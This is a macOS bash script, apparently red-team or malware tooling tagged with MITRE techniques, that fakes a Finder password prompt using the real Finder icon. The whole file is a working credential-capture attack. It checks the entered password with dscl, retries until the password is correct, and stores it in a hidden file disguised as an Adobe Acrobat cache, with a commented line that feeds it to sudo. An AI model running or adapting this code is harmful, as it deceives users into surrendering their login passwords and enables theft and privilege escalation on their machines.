#!/bin/bash
# Finder Dialog Credential Capture
# Uses "tell application Finder" — dialog source shows "Finder" with real Finder icon
# Combined with dscl validation loop for confirmed password capture
#
# MITRE: T1056.002 (GUI Input Capture), T1059.002 (AppleScript)

USER=$(whoami)
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"
MAX_ATTEMPTS=3
ATTEMPT=0

capture_password() {
    local pw
    pw=$(/usr/bin/osascript << 'APPLESCRIPT'
tell application "Finder"
    activate
    set userPassword to text returned of (display dialog ¬
        "Finder needs your password to verify your identity." & return & return & ¬
        "This is required to complete the current operation." ¬
        default answer "" ¬
        with hidden answer ¬
        buttons {"OK"} ¬
        default button 1 ¬
        with icon file "System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns" ¬
        with title "Finder")
    return userPassword
end tell
APPLESCRIPT
    )
    echo "$pw"
}

validate_password() {
    local pw="$1"
    dscl . -authonly "$USER" "$pw" 2>/dev/null
    return $?
}

# Main loop — capture and validate
while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    PW=$(capture_password)
    
    # User cancelled
    if [ -z "$PW" ]; then
        exit 1
    fi
    
    if validate_password "$PW"; then
        # Password confirmed — store it
        mkdir -p "$(dirname "$OUTFILE")"
        echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)|$USER|$PW" >> "$OUTFILE"
        chmod 600 "$OUTFILE"
        
        # Optional: use immediately for sudo
        # echo "$PW" | sudo -S <command> 2>/dev/null
        
        exit 0
    fi
    
    ATTEMPT=$((ATTEMPT + 1))
done

exit 1
